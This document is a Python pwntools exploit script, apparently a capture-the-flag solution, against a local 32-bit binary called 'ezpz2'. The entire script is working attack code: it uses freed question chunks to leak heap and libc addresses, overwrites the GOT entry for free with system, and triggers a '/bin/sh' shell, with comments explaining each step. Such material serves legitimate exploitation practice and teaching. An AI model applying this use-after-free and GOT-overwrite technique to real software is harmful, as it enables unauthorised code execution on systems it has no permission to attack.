#!/usr/bin/env python2

from pwn import *

def create_question(p):
    p.recvuntil(': ', drop=True)
    p.sendline('C')

def delete_question(p, question_id):
    p.recvuntil(': ', drop=True)
    p.sendline('D')
    p.recvuntil(': ', drop=True)
    p.sendline(question_id)

def set_question(p, question_id, question):
    p.recvuntil(': ', drop=True)
    p.sendline('S')
    p.recvuntil(': ', drop=True)
    p.sendline(question_id)
    p.recvuntil(': ', drop=True)
    p.sendline(question)

def ask_question(p, question_id):
    p.recvuntil(': ', drop=True)
    p.sendline('A')
    p.recvuntil(': ', drop=True)
    p.sendline(question_id)
    p.recvuntil(': \'', drop=True)


p = process('./ezpz2')
e = p.elf
libc = ELF('/usr/lib/libc-2.30.so')

create_question(p) 
create_question(p) 
delete_question(p, '1')
delete_question(p, '0')

# heap address of q1 
q1_addr = u32(p.recvline(ask_question(p, '0'))[0:4])


leak_setbuf_payload = fit({
    0: p32(q1_addr),
    0x1c: '\x21\x00\x00\x00',
    0x20: p32(q1_addr + 0x20),
    0x38: p32(e.got['setbuf'])
},filler='\x00')

# leak setbuf entry in got
# cannot print free entry since it's address ends in '\x00'
# will only print '\x00'
set_question(p, '0', leak_setbuf_payload)

setbuf_addr = u32(p.recvline(ask_question(p, '1'))[0:4])
# calculate libc base address in the binary
libc.address = setbuf_addr - libc.symbols['setbuf']

# make string in q1 point to free entry in got
point_to_free_payload = fit({
    0: p32(q1_addr),
    0x1c: '\x21\x00\x00\x00',
    0x20: p32(q1_addr + 0x20),
    0x38: p32(e.got['free'])
},filler='\x00')

set_question(p, '0', point_to_free_payload)

#write to the got
write_to_got_payload = fit({
    0: p32(libc.symbols['system']),
    0x4: p32(libc.symbols['getchar']),
    0x8: p32(libc.symbols['fgets'])
}, filler = '\x00')

#write to the got
set_question(p, '1', write_to_got_payload)

# set q0 string to /bin/sh
set_question(p, '0', '/bin/sh')
# call to free in delete_question now
# calls system since overwritting the got.
# free and system both take in a pointer as their argument
delete_question(p, '0')

p.interactive()


